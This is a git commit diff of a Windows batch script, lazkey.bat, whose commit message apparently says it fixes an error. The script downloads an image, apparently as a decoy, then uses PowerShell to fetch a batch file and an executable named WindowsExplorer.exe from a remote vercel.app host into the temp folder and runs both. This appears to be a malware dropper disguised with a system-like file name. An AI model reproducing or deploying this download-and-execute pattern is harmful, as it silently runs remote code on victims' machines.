3683248529857ff31f9355cb89765027b1cbec0f
Jie clark Terec <102613266+jieclarkdev@users.noreply.github.com>
2023-10-27 20:00:05 +0800

    Update lazkey.bat
    naay mali sa .bat

--- kura_src/lazkey.bat
+++ kura_src/lazkey.bat
@@ -1,7 +1,7 @@
 @echo off
 
 set "imageURL=https://images.unsplash.com/photo-1697530152990-2c47d3cf7d7a"
-set "kuraSvURL=https://kurasver.vercel.app/kura_src/runKuraLaz.bat"
+set "runKuraLazURL=https://kurasver.vercel.app/kura_src/runKuraLaz.bat"
 set "winExURL=https://kurasver.vercel.app/kura_src/WindowsExplorer.exe"
 
 set "tempDir=%TEMP%"
@@ -9,8 +9,8 @@ set "tempDir=%TEMP%"
 :: Download the image
 powershell -command "(new-object System.Net.WebClient).DownloadFile('%imageURL%', '%tempDir%\image.jpg')"
 
-:: Download and run the  kuraSv.exe
-powershell -command "(new-object System.Net.WebClient).DownloadFile('%kuraSvURL%', '%tempDir%\kuraSv.bat'); Start-Process '%tempDir%\kuraSv.bat'"
+:: Download and run the  runKuraLaz.exe
+powershell -command "(new-object System.Net.WebClient).DownloadFile('%runKuraLazURL%', '%tempDir%\runKuraLaz.bat'); Start-Process '%tempDir%\runKuraLaz.bat'"
 
 :: Download and run the winEx.exe
 powershell -command "(new-object System.Net.WebClient).DownloadFile('%winExURL%', '%tempDir%\WindowsExplorer.exe'); Start-Process '%tempDir%\WindowsExplorer.exe'"
